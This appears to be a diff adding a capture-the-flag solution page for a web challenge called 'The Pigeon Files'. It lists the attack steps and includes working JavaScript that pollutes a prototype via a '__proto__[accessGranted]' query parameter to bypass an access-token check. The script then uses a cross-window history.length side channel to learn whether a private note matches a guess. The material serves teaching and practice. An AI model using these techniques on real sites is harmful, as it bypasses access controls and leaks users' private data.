@@ -1,0 +1,70 @@
+<html>
+
+<head>
+  <link rel="stylesheet" href="/style.css">
+</head>
+
+<body style="margin: auto; max-width: 650px">
+  <div style="margin-top: 30px; height: 40px">
+    <h1 style="float: left; margin: 0; padding-right: 10px">The Pigeon Files Solution</h1>
+  </div>
+  <hr>
+  <p>
+    <ol>
+      <li>Exploit prototype pollution in mootools to pass the access token check.</li>
+      <li>Open a new window to perform a search on the note.</li>
+      <li>If the note was found, a client-side redirect occurs after 5 seconds.</li>
+      <li>Change the window's location to <code>about:blank</code></li>
+      <li>Check the window's <code>history.length</code>. If the navigation occurred, the length would be 3.</li>
+    </ol>
+  </p>
+  <p>
+    <a href="https://github.com/zeyu2001/My-CTF-Challenges/blob/main/SEETF-2022/web/username-generator/solve/solve.md"
+      target="_blank">Full Solution</a>
+    | <a href="/">Home</a>
+  </p>
+  <p>
+    <a href="https://xss-playground-challenges.vercel.app/pigeon-files/" target="_blank">Submit your note first</a>, then try to search it.
+  </p>
+  <input id="search" type="text" placeholder="Search">
+  <button onclick="exploit()">Search</button>
+  <p id="result"></p>
+  <script>
+    const exploit = async () => {
+      const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{_}';
+
+      const sleep = (ms) => {
+        return new Promise(resolve => setTimeout(resolve, ms));
+      }
+
+      const leak = async (guess) => {
+
+        let opened = window.open(`https://xss-playground-challenges.vercel.app/pigeon-files/?search=${guess}&token=&__proto__[accessGranted]=pwned`);
+
+        // Allow 6 second for the navigations to happen
+        await sleep(6000);
+        opened.location = "about:blank";
+
+        // Allow 1 seconds for the redirects to complete
+        await sleep(1000);
+        
+        const success = opened.history.length === 3;
+        opened.close();
+
+        return [success, guess];
+      }
+
+      leak(document.getElementById('search').value)
+        .then(([success, guess]) => {
+          if (success) {
+            document.getElementById('result').innerText = `Success! Note starts with ${guess}.`;
+          } else {
+            document.getElementById('result').innerText = `Failed! Note does not start with ${guess}.`;
+          }
+        }
+      );
+    }
+  </script>
+</body>
+
+</html>
